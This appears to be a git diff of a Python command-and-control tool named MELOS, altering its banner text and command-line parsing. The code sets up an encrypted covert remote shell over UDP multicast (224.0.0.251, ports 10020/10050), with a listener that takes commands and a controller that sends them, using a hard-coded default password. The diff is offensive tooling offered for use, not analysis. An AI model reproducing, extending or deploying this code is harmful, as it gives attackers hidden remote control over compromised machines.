@@ -9,7 +9,7 @@
                                    .
          .                  .          .
   .      |                
-       --o--         LO       .
+       --o--        LO        .
          |                                o    
    .           .
 
@@ -73,7 +73,7 @@ def multicast_send(hops=255):
   return sock
 
 def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, responseport=10050):
-  print(f"   =[ Opened listener on {multicast_group}:{commandport} ]\n")
+  print(f"    =[ Awaiting on {multicast_group}:{commandport}    ]\n")
   sock = multicast_recv(commandport, multicast_group, ttl=60)
   respond = multicast_send()
   while True:
@@ -97,17 +97,17 @@ def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, resp
       pass
 
 def melos_cmd(password, multicast_group="224.0.0.251", commandport=10020, recvport=10050):
-  print(f"    =[ MELOS awaiting {multicast_group}:{recvport} ]\n")
+  print(f"    =[ MELOS C2 {multicast_group}:{recvport}       ]\n")
   listen = multicast_recv(recvport, multicast_group, ttl=5)
   sock = multicast_send()
   while True:
     try:
-      cmd = input(f"melos@MERSA({multicast_group}) ~$ ")
+      cmd = input(f"melos@{multicast_group}:{recvport} $ ")
       enc_cmd = encrypt(cmd, password)
       sock.sendto(enc_cmd, (multicast_group, commandport))
       stdout, address = listen.recvfrom(4096)
       plain = decrypt(stdout, password)
-      print(f"     =[ Packet From {address[0]}:{address[1]}]\n{plain}")
+      print(f"     =[ Packet From {address[0]}:{address[1]} ]\n{plain}")
       if cmd == "exit":
         listen.close()
         sock.close()
@@ -123,12 +123,26 @@ if __name__ == "__main__":
   
   print(__doc__.split("\n\n")[0])
   
-  password = "default"
+  if len(sys.argv) == 1 or sys.argv[-1] == "-p" or "-h" in sys.argv:
+    print("    =[ Use -l or --listen to start listener ]")
+    print("    =[ Use -c or --cmd to control listener  ]")
+    print("    =[ Use -p or --password to set password ]\n")
+    sys.exit()
   
-  if len(sys.argv) == 1:
-    print(f"    =[ Use -l or --listen to start listener ]")
-    print(f"    =[ Use -c or --cmd to control listener  ]\n")
-  elif sys.argv[1] in ["-c", "--cmd"]:
-    melos_cmd(password)
-  elif sys.argv[1] in ["-l", "--listen"]:
-    melos_shell(password)
+  if ("-p" not in sys.argv or "--password" not in sys.argv) and len(sys.argv) <= 3:
+    password = "default"
+    print("    =[ Password is set to default!      ]")
+  else:
+    if "-p" in sys.argv:
+      password = sys.argv[sys.argv.index("-p")+1]
+    elif "--password" in sys.argv:
+      password = sys.argv[sys.argv.index("--password")+1]
+  
+  for arg in ["-c", "--cmd"]:
+    if arg in sys.argv:
+      melos_cmd(password)
+      sys.exit()
+  for arg in ["-l", "--listen"]:
+    if arg in sys.argv:
+      melos_shell(password)
+      sys.exit()
